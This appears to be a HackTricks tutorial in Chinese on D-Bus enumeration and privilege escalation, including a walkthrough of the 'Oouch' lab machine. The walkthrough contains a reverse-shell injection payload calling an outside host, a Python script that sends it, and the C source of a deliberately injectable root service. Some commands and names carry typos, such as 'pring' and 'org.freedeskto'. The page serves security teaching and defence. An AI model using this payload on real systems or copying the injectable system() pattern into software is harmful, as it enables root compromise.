# D-Bus 枚举与命令注入权限提升

{{#include ../../banners/hacktricks-training.md}}

## **GUI 枚举**

D-Bus 在 Ubuntu 桌面环境中用作进程间通信（IPC）中介。在 Ubuntu 上，可以观察到多个消息总线同时运行：system bus 主要由**特权服务用来公开系统范围内相关的服务**；每个已登录用户则有一个 session bus，用于公开仅与该用户相关的服务。这里主要关注 system bus，因为它关联着以更高权限（例如 root）运行的服务，而我们的目标是提升权限。值得注意的是，D-Bus 架构为每个 session bus 配备了一个“路由器”，负责根据客户端为其希望通信的服务指定的地址，将客户端消息重定向到相应的服务。<sup>[[1]](#references)</sup>

D-Bus 上的服务由其公开的**对象**和**接口**定义。对象类似于标准 OOP 语言中的类实例，每个实例都由一个唯一的**对象路径**标识。该路径类似于文件系统路径，用于唯一标识服务公开的每个对象。研究中一个重要的接口是 **org.freedesktop.DBus.Introspectable**，它只有一个方法：Introspect。该方法会返回一个 XML 表示，其中包含对象支持的方法、信号和属性；这里重点关注方法，省略属性和信号。

为了与 D-Bus 接口通信，我们使用了两个工具：名为 **gdbus** 的 CLI 工具，便于在脚本中调用 D-Bus 公开的方法；以及 [**D-Feet**](https://wiki.gnome.org/Apps/DFeet)，这是一个基于 Python 的 GUI 工具，旨在枚举每条总线上可用的服务，并显示每个服务包含的对象。

```bash
sudo apt-get install d-feet
```

如果你正在检查 **session bus**，请先确认当前地址：

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

第一张图片显示了注册到 D-Bus 系统总线的服务；选择 System Bus 按钮后，**org.debin.apt** 会特别突出显示。D-Feet 会查询此服务中的对象，并显示所选对象的接口、方法、属性和信号，如第二张图片所示。每个方法的签名也会详细列出。

一个值得注意的功能是显示服务的**进程 ID (pid)** 和**命令行**，这有助于确认服务是否以提升的权限运行，对研究很有参考价值。

**D-Feet 还允许调用方法**：用户可以输入 Python 表达式作为参数，D-Feet 会将其转换为 D-Bus 类型，再传递给服务。

不过请注意，**有些方法要求先进行身份验证**，之后才允许我们调用。我们会忽略这些方法，因为我们的目标本来就是在没有凭据的情况下提升权限。

还要注意，有些服务会向另一个名为 org.freedeskto.PolicyKit1 的 D-Bus 服务查询是否应允许用户执行某些操作。

## **命令行枚举**

### 列出服务对象

可以通过以下方式列出已打开的 D-Bus 接口：

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

标记为 **`(activatable)`** 的服务尤其值得关注，因为它们**尚未运行**，但可以通过 bus 请求按需启动。不要只停留在 `busctl list`；要将这些名称映射到它们实际会执行的二进制文件。

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

这可以快速告诉你，对于一个可激活名称，哪个 `Exec=` 路径会启动，以及它以什么身份运行。如果二进制文件或其执行链保护不足，未激活的服务仍可能成为权限提升途径。

对于特权 USB 镜像服务，将其 system-bus 名称与其镜像写入操作的**有效**策略关联起来。旧版供应商规则可能允许某个管理 Unix 组在不提示输入密码的情况下获得 `ResultActive=yes`；请确认当前账户属于该组、会话处于活动状态、规则确实已加载且未被覆盖，并且已安装的 helper 仍接受调用者指定的源路径和目标路径。仅凭服务描述符或旧版软件包，无法证明可以任意访问文件。缺少激活描述符也不能排除服务已在运行。检查固定策略文件和服务文件，但不要调用镜像写入方法；参见[原始服务分析](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)。

#### 连接

[来自维基百科：](https://en.wikipedia.org/wiki/D-Bus)当进程与总线建立连接时，总线会为该连接分配一个称为_唯一连接名称_的特殊总线名称。这类总线名称不可变——只要连接存在，就保证名称不会改变；更重要的是，在总线的生命周期内，它们不能被重复使用。这意味着，其他连接永远不会被分配相同的唯一连接名称，即使同一进程关闭与总线的连接后又重新建立连接也是如此。唯一连接名称很容易识别，因为它们以冒号字符开头，而冒号在其他情况下是不允许的。<sup>[[4]](#references)</sup>

### 服务对象信息

然后，你可以通过以下方式获取有关接口的信息：

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

同时将总线名称与其 `systemd` 单元及可执行文件路径关联起来：

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

这回答了 privesc 过程中最关键的实际问题：**如果方法调用成功，究竟会由哪个真实二进制文件和 unit 执行该操作？**

### 列出 Service Object 的接口

你需要拥有足够的权限。

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### 内省服务对象的接口

注意，在这个示例中，选择的是使用 `tree` 参数发现的最新接口（_见上一节_）：

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

注意接口 `htb.oouch.Block` 的 `.Block` 方法（这是我们感兴趣的那个）。其他列中的“s”可能表示它需要一个字符串。

在尝试任何危险操作之前，先验证一个**以读取为主**或其他低风险的方法。这样可以清楚地区分三种情况：语法错误、可访问但被拒绝，或可访问且允许。

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### 将 D-Bus 方法与策略和操作相关联

Introspection 会告诉你**可以**调用什么，但不会告诉你调用为何被允许或拒绝。要进行实际的 privesc triage，通常需要同时检查**三个层面**：

1. **Activation 元数据**（`.service` 文件或 `SystemdService=`），了解实际运行的是哪个二进制文件和 unit。
2. **D-Bus XML 策略**（`/etc/dbus-1/system.d/`、`/usr/share/dbus-1/system.d/`），了解哪些用户可以 `own`、`send_destination` 或 `receive_sender`。
3. **Polkit action 文件**（`/usr/share/polkit-1/actions/*.policy`），了解默认授权模型（`allow_active`、`allow_inactive`、`auth_admin`、`auth_self`、`org.freedesktop.policykit.imply`）。

有用的命令：

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

不要假设 D-Bus 方法与 Polkit action 一一对应。同一个方法可能会根据被修改的对象或运行时上下文选择不同的 action。因此，实际工作流程如下：

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` 并 grep 相关的 `.policy` 文件
3. 使用 `busctl call`、`gdbus call` 或 `dbusmap --enable-probes --null-agent` 进行低风险的实时探测

代理或兼容性服务值得格外关注。**以 root 身份运行的代理**通过自身预先建立的连接将请求转发给另一个 D-Bus 服务时，可能会意外导致后端将每个请求都视为来自 UID 0，除非原始调用者的身份经过重新验证。<sup>[[3]](#references)</sup>

### 监控/捕获接口

拥有足够权限后（只有 `send_destination` 和 `receive_sender` 权限还不够），你就可以**监控 D-Bus 通信**。

要**监控**一段**通信**，你需要是 **root**。如果你已经是 root 却仍然遇到问题，请查看 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 和 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> 如果你知道如何配置 D-Bus 配置文件以**允许非 root 用户嗅探**通信，请**联系我**！

监控方式有多种：

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

在以下示例中，接口 `htb.oouch.Block` 被监控，并且**消息 "**_**lalalalal**_**" 通过通信错误发送**：

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

你可以使用 `capture` 而不是 `monitor`，将结果保存到 Wireshark 可打开的 **pcapng** 文件中：

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### 过滤所有噪声 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

如果总线上的信息实在太多，可以像这样传入匹配规则：

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

可以指定多条规则。如果一条消息符合_任意一条_规则，就会打印该消息。例如：

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

有关匹配规则语法的更多信息，请参阅 [D-Bus 文档](http://dbus.freedesktop.org/doc/dbus-specification.html)。<sup>[[7]](#references)</sup>

### 更多

`busctl` 还有更多选项，[**在此查看所有选项**](https://www.freedesktop.org/software/systemd/man/busctl.html)。

## **易受攻击的场景**

作为 HTB 主机 “oouch” 中的用户 **qtc**，你可以找到一个**意外的 D-Bus 配置文件**，其位置为 _/etc/dbus-1/system.d/htb.oouch.Block.conf_：

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

请注意，前面的配置表明，**你需要以用户 `root` 或 `www-data` 的身份，通过此 D-BUS 通信发送和接收信息**。

作为 docker container **aeb4525789d8** 中的用户 **qtc**，你可以在文件 _/code/oouch/routes.py_ 中找到一些与 dbus 相关的代码。以下是值得关注的代码：

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

如你所见，它正在**连接到一个 D-Bus 接口**，并向 **"Block" 函数**发送 "client_ip"。

在 D-Bus 连接的另一端，有一个正在运行的 C 编译二进制程序。此代码正在 D-Bus 连接中**监听** IP 地址，并调用 `system` 函数执行 iptables，以阻止给定的 IP 地址。\
**这里故意让 `system` 调用存在命令注入漏洞**，因此像下面这样的 payload 会创建一个反向 shell：`;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### 利用它

本页末尾可以找到 **D-Bus 应用程序的完整 C 代码**。在第 91–97 行之间，可以查看 **`D-Bus object path`** 和 **`interface name`** 是如何**注册的**。要向 D-Bus 连接发送信息，需要这些信息：

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

另外，在第 57 行可以看到，此 D-Bus 通信**唯一注册的方法**名为 `Block`(_**因此，在下一节中，payload 将发送到服务对象 `htb.oouch.Block`、接口 `/htb/oouch/Block` 和方法名 `Block`**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

以下 Python 代码会通过 `block_iface.Block(runme)` 将 payload 发送到 D-Bus 连接的 `Block` 方法（_注意，这是从前一段代码中提取的_）：

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl and dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send` 是用于向“Message Bus”发送消息的工具
- Message Bus（消息总线）——一种软件，系统借助它可以轻松实现应用程序之间的通信。它与 Message Queue（消息队列，消息按顺序排列）相关，但 Message Bus 中的消息采用订阅模式发送，速度也很快。
- “-system” 标签用于指定这是系统消息，而不是会话消息（默认情况）。
- “–print-reply” 标签用于正确打印我们发送的消息，并以人类可读的格式接收任何回复。
- “–dest=Dbus-Interface-Block” Dbus 接口的地址。
- “–string:”——我们要发送到接口的消息类型。发送消息有多种格式，如 double、bytes、booleans、int、objpath。其中，当我们要向 Dbus 接口发送文件路径时，“object path”很有用。在这种情况下，我们可以使用一个特殊文件（FIFO），以文件名的形式向接口传递命令。“string:;”——用于再次调用 object path，并在其中放置 FIFO 反向 shell 文件/命令。

_注意，在 `htb.oouch.Block.Block` 中，第一部分（`htb.oouch.Block`）指的是服务对象，最后一部分（`.Block`）指的是方法名。_

### C code

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## 自动化枚举辅助工具 (2023-2025)

手动使用 `busctl`/`gdbus` 枚举大型 D-Bus 攻击面很快就会变得十分繁琐。过去几年发布的两款小型 FOSS 工具，可以在 red-team 或 CTF 活动中加快枚举速度：

### dbusmap ("Nmap for D-Bus")
* 作者：@taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* 使用 C 编写；这是一个小于 50 kB 的单文件静态二进制程序，会遍历每个对象路径，获取 `Introspect` XML，并将其映射到对应的 PID/UID。<sup>[[5]](#references)</sup>
* 实用的 flags：
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* 该工具会用 `!` 标记未受保护的 well-known names，立即揭示你可以 *接管* 的服务，或可从非特权 shell 访问的方法调用。

### uptux.py
* 作者：@initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* 仅用 Python 编写的脚本，用于查找 systemd 单元中的*可写*路径，以及权限过于宽松的 D-Bus policy 文件（例如 `send_destination="*"`）。<sup>[[6]](#references)</sup>
* 快速用法：
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* D-Bus 模块会搜索以下目录，并突出显示任何可被普通用户 spoof 或 hijack 的服务：
  * `/etc/dbus-1/system.d/` 和 `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/`（供应商覆盖配置）

---

## 值得关注的 D-Bus 权限提升漏洞（2024-2025）

关注近期发布的 CVE 有助于发现自定义代码中类似的不安全模式。以下是两个很好的近期示例：<sup>[[2]](#references)[[3]](#references)</sup>

| 年份 | CVE | 组件 | 根本原因 | 攻击方面的教训 |
|------|-----|-----------|-----------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | 以 root 运行的服务暴露了一个 D-Bus 接口，非特权用户可以重新配置该接口，包括加载攻击者控制的宏行为。 | 如果守护进程在 system bus 上暴露**设备/配置文件/配置管理**功能，应将可写配置和宏功能视为代码执行原语，而不只是“设置”。 |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | 以 root 运行的兼容性代理将请求转发给后端服务时，没有保留原始调用者的安全上下文，因此后端将该代理误认为 UID 0。 | 应将 **proxy / bridge / compatibility** D-Bus 服务视为一类独立的漏洞：如果它们会中继特权调用，应验证调用者的 UID/Polkit 上下文如何传递到后端。 |

需要注意的模式：
1. 服务在 system bus 上**以 root 身份运行**。
2. 要么**没有授权检查**，要么检查针对的是**错误的主体**。
3. 可访问的方法最终会更改系统状态：安装软件包、更改用户/组、修改引导加载程序配置、更新设备配置文件、写入文件，或直接执行命令。

使用 `dbusmap --enable-probes` 或手动调用 `busctl call`，确认某个方法是否可访问；然后检查服务的策略 XML 和 Polkit 操作，以了解实际授权的是**哪个主体**。

---

## 加固与检测快速措施

* 搜索全局可写或 *send/receive* 开放的策略：
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* 对危险方法要求 Polkit 授权——即使是 *root* proxies，也应将*调用者*的 PID 而非自身 PID 传递给 `polkit_authority_check_authorization_sync()`。
* 在长期运行的辅助进程中降权（连接 bus 后，使用 `sd_pid_get_owner_uid()` 切换 namespace）。
* 如果无法移除某项服务，至少将其*限制*在专用 Unix group 中，并在其 XML policy 中限制访问。
* 蓝队：使用 `busctl capture > /var/log/dbus_$(date +%F).pcapng` 捕获 system bus，并将其导入 Wireshark 以检测异常。

---

## References

- [1] [Ubuntu Desktop 中的 USBCreator D-Bus 权限提升](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752：D-Bus 服务允许任何非特权用户进行配置](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy：Deepin D-Bus 代理服务中的身份验证绕过（CVE-2025-23222）](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - 维基百科](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - “D-Bus 版 Nmap”](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus 文档](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
